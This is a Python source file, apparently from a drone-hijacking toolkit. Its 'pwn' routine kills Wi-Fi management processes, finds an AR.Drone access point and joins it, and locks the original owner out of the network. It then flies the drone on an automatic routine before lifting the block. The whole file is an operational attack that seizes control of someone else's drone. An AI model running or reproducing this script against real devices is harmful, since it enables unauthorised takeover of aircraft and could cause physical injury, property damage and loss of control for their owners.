import os, signal, sys, platform
from command.scancommand import find_drone
from command.autoflightcommand import Autofligthcommand
from command.blockotherscommand import blockothers
from lib.pyiw import WirelessInterface
from lib.libardrone import ARDrone
from termcolor import colored

info_str = colored("[*] ", "blue")
succ_str = colored("[+] ", "green")

def pwn(interface):
    print info_str + "starting autopwn on interface %s" % interface
   
    # check for interfering processes 
    if "arm" in platform.machine().lower():
        os.system("killall wpa_supplicant")
    else:
        os.system("airmon-ng check kill")

    print info_str+"searching for drone..."
    iface = WirelessInterface(interface)
    drone = find_drone(iface, False)
    print succ_str+"drone \"%s\" found" % drone

    print info_str+"connecting..."
    iface.connect(drone)
    print succ_str+"connection succeeded"

    print info_str+"waiting for ip"
    iface.wait_for_ip()
    print succ_str+"ip address acquired"

    print info_str+"blocking original owner"
    # dont block when auto mode is active, drone goes crazy and nobody will be able to stop it besides chuck norris
    blockothers(interface, False)
    print succ_str+"owner locked out"

    print info_str+"executing automatic flight routine"
    auto = Autofligthcommand()
    auto.demo()

    print info_str+"removing blocking of owner"
    blockothers(interface, True)
    sys.exit(0)
